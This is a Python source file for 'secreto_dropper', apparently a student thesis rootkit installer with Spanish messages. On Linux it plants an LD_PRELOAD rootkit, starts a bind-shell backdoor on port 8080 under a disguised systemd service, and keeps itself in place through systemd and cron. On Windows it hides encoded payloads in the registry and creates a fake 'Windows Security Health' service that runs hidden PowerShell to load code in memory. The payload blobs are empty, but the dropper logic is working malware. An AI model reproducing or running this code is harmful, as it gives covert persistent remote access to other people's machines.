#!/usr/bin/env python3

import base64
import os
import platform
import re
import subprocess
import sys
import tempfile
import shutil

                                                                                  
                  
                                                                          
                                                 
                                                                                  
_STAGER_ENC    = ""                                           
_PAYLOAD64_ENC = ""                                           
_PAYLOAD86_ENC = ""                                           

                                                                                  
            
                                                                                  
XOR_KEY       = 0x26
HIDDEN_PORT   = 8080
SERVICE_NAME  = "secreto_svc"
BD_PATH       = "/usr/local/lib/secreto_bd"
BD_SVC        = "systemd-networkd-helper.service"
PRELOAD_SVC   = "systemd-core-update.service"
REG_PATH      = r"SOFTWARE"

                                                                                  
            
                                                                                  

def banner():
    print("=" * 54)
    print("   secreto_dropper  |  TFG Rootkit Cross-Platform")
    print("=" * 54)

def detect_os() -> str:
    return {"Windows": "windows", "Linux": "linux"}.get(platform.system(), "unknown")

def ok(m):  print(f"[+] {m}")
def inf(m): print(f"[*] {m}")
def err(m): print(f"[-] {m}"); sys.exit(1)

def xor_bytes(data: bytes) -> bytes:
    return bytes(b ^ XOR_KEY for b in data)

def decode_payload(b64_str: str) -> bytes:
    """Decodifica base64 y descifra XOR."""
    if not b64_str:
        return b""
    return xor_bytes(base64.b64decode(b64_str))

                                                                                  
                                 
                                                    
                                                                            
                                                                                  

LINUX_SO_X86_64_B64 = ""                                           
LINUX_SO_ARM64_B64  = ""
LINUX_BACKDOOR_B64  = ""                                                                             

def install_linux():
    if os.geteuid() != 0:
        err("Se requieren privilegios de root (sudo).")

    arch = platform.machine()                                 
    dest = "/usr/local/lib/secreto_rootkit.so"

                                                                           
                                                                     
    preload_bak = None
    if os.path.exists("/etc/ld.so.preload"):
        try:
            with open("/etc/ld.so.preload") as fh:
                preload_bak = fh.read()
            with open("/etc/ld.so.preload", "w") as fh:
                fh.write("")
        except Exception:
            pass

    def _restaurar_preload():
        if preload_bak:
            try:
                with open("/etc/ld.so.preload", "w") as fh:
                    fh.write(preload_bak)
            except Exception:
                pass

    so_bytes = None

                                                                               
                                                                        
                                                                        
    prebuilt = {
        "x86_64":  LINUX_SO_X86_64_B64,
        "aarch64": LINUX_SO_ARM64_B64,
    }
    b64 = prebuilt.get(arch, "")
    if b64:
        inf(f"Desplegando binario pre-compilado ({arch})...")
        try:
            so_bytes = base64.b64decode(b64)
            ok("Binario pre-compilado listo (sin necesidad de compilador)")
        except Exception as e:
            inf(f"Binario pre-compilado invalido: {e} — intentando compilar...")
            so_bytes = None

    if so_bytes is None:
        err("Payload Linux no embebido. Ejecuta: python build_dropper.py")

                                                                                
    with open(dest, "wb") as fh:
        fh.write(so_bytes)
    os.chmod(dest, 0o644)

    with open("/etc/ld.so.preload", "w") as fh:
        fh.write(dest + "\n")

    ok(f"Instalado: {dest}")
    ok("/etc/ld.so.preload configurado")

    bd_activo = _persist_linux(dest)

    print()
    if bd_activo:
        ok(f"Bind shell activo en puerto {HIDDEN_PORT}")
        ok(f"Conexion  -> nc <ip> {HIDDEN_PORT}")
    ok("Toggle    -> kill -64 31337")
def _persist_linux(so_path: str):
    """Instala backdoor (servicio systemd) + persistencia ld.so.preload."""

                                                                                
    bd_svc_unit = (
        "[Unit]\n"
        "Description=Network Configuration Helper\n"
        "After=network.target\n"
        "StartLimitIntervalSec=0\n\n"
        "[Service]\n"
        "Type=simple\n"
        "Restart=always\n"
        "RestartSec=10\n"
        + f"ExecStart={BD_PATH}\n"
        + "StandardOutput=null\n"
        "StandardError=null\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )
    bd_ok = False
    if LINUX_BACKDOOR_B64:
        try:
            bd_bytes = base64.b64decode(LINUX_BACKDOOR_B64)
            with open(BD_PATH, "wb") as f:
                f.write(bd_bytes)
            os.chmod(BD_PATH, 0o755)
            bd_svc_path = f"/etc/systemd/system/{BD_SVC}"
            with open(bd_svc_path, "w") as f:
                f.write(bd_svc_unit)
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", "--now", BD_SVC],
                           capture_output=True)
            bd_ok = True
            ok(f"Backdoor instalado: {BD_PATH}")
            ok(f"Servicio: {BD_SVC}  (Restart=always)")
        except Exception as e:
            inf(f"Backdoor service: {e}")
    else:
        inf("LINUX_BACKDOOR_B64 vacio -- ejecuta build_dropper.py primero")

                                                                               
    preload_unit = (
        "[Unit]\n"
        "Description=System Core Update Service\n"
        "After=local-fs.target\n"
        "DefaultDependencies=no\n\n"
        "[Service]\n"
        + f"ExecStart=/bin/sh -c 'echo {so_path} > /etc/ld.so.preload'\n"
        + "Type=oneshot\n"
        "RemainAfterExit=yes\n\n"
        "[Install]\n"
        "WantedBy=sysinit.target\n"
    )
    try:
        with open(f"/etc/systemd/system/{PRELOAD_SVC}", "w") as f:
            f.write(preload_unit)
        subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
        subprocess.run(["systemctl", "enable", "--now", PRELOAD_SVC],
                       capture_output=True)
        ok(f"Persistencia preload: {PRELOAD_SVC}")
    except Exception as e:
        inf(f"Persistencia systemd preload: {e}")

                                                                               
    cron_line = "@reboot echo '" + so_path + "' > /etc/ld.so.preload\n"
    try:
        r = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        cur = r.stdout if r.returncode == 0 else ""
        if cron_line not in cur:
            subprocess.run(["crontab", "-"],
                           input=cur.rstrip("\n") + "\n" + cron_line,
                           capture_output=True, text=True)
            ok("Persistencia cron @reboot (capa 2)")
    except Exception:
        pass

    return bd_ok

                                                                                  
         
                                                                                  

def install_windows():
                     
    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            err("Se requieren privilegios de Administrador.")
    except Exception: pass

                                                   
    if not _STAGER_ENC or not _PAYLOAD64_ENC or not _PAYLOAD86_ENC:
        err("Payloads Windows no empaquetados.\n"
            "    Compila en Visual Studio y luego ejecuta:  python build_dropper.py")

    inf("Descifrando payloads...")
    stager   = decode_payload(_STAGER_ENC)
    p64      = decode_payload(_PAYLOAD64_ENC)
    p86      = decode_payload(_PAYLOAD86_ENC)

    if not stager or not p64 or not p86:
        err("Error descifrando payloads.")

                                                               
    inf("Sembrando payloads en el registro...")
    try:
        import winreg
        hklm = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key  = winreg.OpenKey(hklm, REG_PATH, 0,
                               winreg.KEY_SET_VALUE | 0x0100)                   
        winreg.SetValueEx(key, "secreto_stager",      0, winreg.REG_BINARY, stager)
        winreg.SetValueEx(key, "secreto_payload",     0, winreg.REG_BINARY, p64)
        winreg.SetValueEx(key, "secreto_payload_x86", 0, winreg.REG_BINARY, p86)
        winreg.CloseKey(key)
        winreg.CloseKey(hklm)
        ok("Registro: secreto_stager / secreto_payload / secreto_payload_x86")
    except Exception as e:
        err(f"Error escribiendo en el registro: {e}")

                       
    inf("Creando servicio secreto_svc...")
    ps_cmd = (
        "$d=[Microsoft.Win32.Registry]::LocalMachine"
        ".OpenSubKey('SOFTWARE').GetValue('secreto_stager');"
        "[Reflection.Assembly]::Load([byte[]]$d).EntryPoint.Invoke($null,$null)"
    )
    bin_path = (
        f'cmd.exe /c start /b powershell.exe '
        f'-WindowStyle Hidden -Command "{ps_cmd}"'
    )

                                              
    subprocess.run(
        ["sc", "create", SERVICE_NAME,
         "binPath=", bin_path,
         "type=",    "own",
         "start=",   "auto",
         "error=",   "ignore",
         "DisplayName=", "Windows Security Health"],
        capture_output=True
    )
    subprocess.run(
        ["sc", "config", SERVICE_NAME,
         "binPath=", bin_path,
         "start=",   "auto"],
        capture_output=True
    )

                          
    r = subprocess.run(["sc", "start", SERVICE_NAME], capture_output=True)
    if r.returncode == 0 or b"1056" in r.stderr:                            
        ok(f"Servicio '{SERVICE_NAME}' iniciado")
    else:
        ok(f"Servicio '{SERVICE_NAME}' creado (se iniciará en el próximo arranque)")

    print()
    ok(f"Bind shell activo en puerto {HIDDEN_PORT}")
    ok(f"Conexión  → nc <ip> {HIDDEN_PORT}")

                                                                                  
                      
                                                                                  

def uninstall_linux():
    if os.geteuid() != 0:
        err("Se requieren privilegios de root (sudo).")

    SO_PATH     = "/usr/local/lib/secreto_rootkit.so"
    PRELOAD     = "/etc/ld.so.preload"
    TOGGLE_FILE = "/tmp/.secreto_off"
    BD_BIN           = BD_PATH
    BD_SVC_FILE      = f"/etc/systemd/system/{BD_SVC}"
    PRELOAD_SVC_FILE = f"/etc/systemd/system/{PRELOAD_SVC}"
    SVC_FILE         = BD_SVC_FILE          
    CRON_MARKER = "secreto_rootkit.so"

    print()
    inf("Paso 1/6 — Desactivando hooks vía toggle...")
                                                                 
                                                                     
                                                                          
                                                                                      
    try:
        os.kill(31337, 64)
        ok("Toggle activado: hooks desactivados")
    except OSError:
        inf("Toggle: .so no cargado o PID no existente (instalación parcial)")

    print()
    inf("Paso 2/6 — Limpiando /etc/ld.so.preload...")
                                                                             
                                                      
    try:
                                                                             
                                            
        with open(PRELOAD, "w") as fh:
            fh.write("")
        os.remove(PRELOAD)
        ok("Eliminado: /etc/ld.so.preload")
    except FileNotFoundError:
        inf("No encontrado: /etc/ld.so.preload")
    except Exception as e:
        inf(f"Advertencia: {e}")

    print()
    inf("Paso 3/6 — Eliminando librería...")
    try:
        os.remove(SO_PATH)
        ok(f"Eliminado: {SO_PATH}")
    except FileNotFoundError:
        inf(f"No encontrado: {SO_PATH}")
    except Exception as e:
        inf(f"Advertencia eliminando .so: {e}")

    print()
    inf("Paso 4/6 — Eliminando servicios systemd y backdoor...")
    for svc, path in [
        (BD_SVC,               BD_SVC_FILE),
        (PRELOAD_SVC,           PRELOAD_SVC_FILE),
        ("secreto_svc.service", "/etc/systemd/system/secreto_svc.service"),
    ]:
        subprocess.run(["systemctl", "stop",    svc], capture_output=True)
        subprocess.run(["systemctl", "disable", svc], capture_output=True)
        try:
            os.remove(path); ok(f"Eliminado: {path}")
        except FileNotFoundError:
            pass
        except Exception as e:
            inf(f"Advertencia: {e}")
    try:
        os.remove(BD_BIN); ok(f"Eliminado: {BD_BIN}")
    except FileNotFoundError:
        pass
    subprocess.run(["systemctl", "daemon-reload"], capture_output=True)

    print()
    inf("Paso 5/6 — Limpiando crontab...")
    try:
        r = subprocess.run(["crontab", "-l"],
                           capture_output=True, text=True)
        if r.returncode == 0 and CRON_MARKER in r.stdout:
            clean = "\n".join(
                l for l in r.stdout.splitlines()
                if CRON_MARKER not in l
            )
            subprocess.run(["crontab", "-"],
                           input=clean.strip() + "\n",
                           capture_output=True, text=True)
            ok("Entrada cron eliminada")
        else:
            inf("Crontab: sin entradas del rootkit")
    except Exception as e:
        inf(f"Crontab: {e}")

    print()
    inf("Paso 6/6 — Terminando bind shell (puerto 8080)...")
    r = subprocess.run(["fuser", "-k", f"{HIDDEN_PORT}/tcp"],
                       capture_output=True)
    if r.returncode == 0:
        ok(f"Procesos en puerto {HIDDEN_PORT} terminados")
    else:
        inf(f"Puerto {HIDDEN_PORT}: sin procesos activos")

                                                                       
    try:
        os.remove(TOGGLE_FILE)
    except Exception:
        pass

    print()
    ok("=" * 52)
    ok("Desinstalación completada")
    ok("=" * 52)
    print()
    inf("NOTA: los procesos que ya tenían el .so cargado en")
    inf("      memoria lo mantendrán hasta que sean reiniciados.")
    inf("      Reinicia el sistema para garantizar limpieza total.")

                                                                                  
                  
                                                                                  

def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="secreto_dropper — TFG Rootkit Cross-Platform",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "--uninstall",
        action="store_true",
        help="Desinstalar el rootkit (solo Linux)"
    )
    args = parser.parse_args()

    banner()
    os_name = detect_os()
    inf(f"Sistema detectado: {os_name.upper()}")
    print()

    if args.uninstall:
        if os_name == "linux":
            uninstall_linux()
        else:
            err(f"Desinstalación automática solo disponible en Linux.")
        return

    if os_name == "linux":
        install_linux()
    elif os_name == "windows":
        install_windows()
    else:
        err(f"Sistema operativo no soportado: {platform.system()}")

if __name__ == "__main__":
    main()
